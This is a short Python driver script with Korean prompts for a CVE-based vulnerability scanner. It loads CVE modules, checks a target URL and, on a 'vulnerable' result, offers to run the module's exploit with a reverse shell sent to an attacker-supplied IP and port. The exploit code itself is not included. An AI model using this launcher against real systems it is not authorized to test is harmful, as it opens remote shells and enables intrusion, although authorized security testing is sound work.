import os
import importlib

def load_cve_modules():
    cve_modules = {}
    for filename in os.listdir("cve"):
        if filename.endswith(".py") and not filename.startswith("__"):
            mod_name = filename[:-3]
            module = importlib.import_module(f"cve.{mod_name}")
            cve_modules[module.name()] = module
    return cve_modules

def main():
    print("\n🔎 취약점 자동 진단 도구 (CVE 기반)")
    modules = load_cve_modules()

    for i, name in enumerate(modules):
        print(f"{i+1}. {name}")

    choice = int(input("\n진단할 CVE 번호 선택: ")) - 1
    selected = list(modules.values())[choice]

    target = input("대상 URL 입력 (예: http://192.168.0.10:8080): ").strip()
    result = selected.detect(target)

    print(f"[+] 결과: {result['status']}")
    print(f"[*] 상세: {result['info']}")

    if result['status'] == 'vulnerable':
        run = input("[*] 익스플로잇 실행? (y/n): ").lower()
        if run == 'y':
            ip = input("공격자 IP 입력: ")
            port = input("공격자 포트 입력: ")
            selected.exploit(target, reverse_shell_ip=ip, reverse_shell_port=port)

if __name__ == '__main__':
    main()
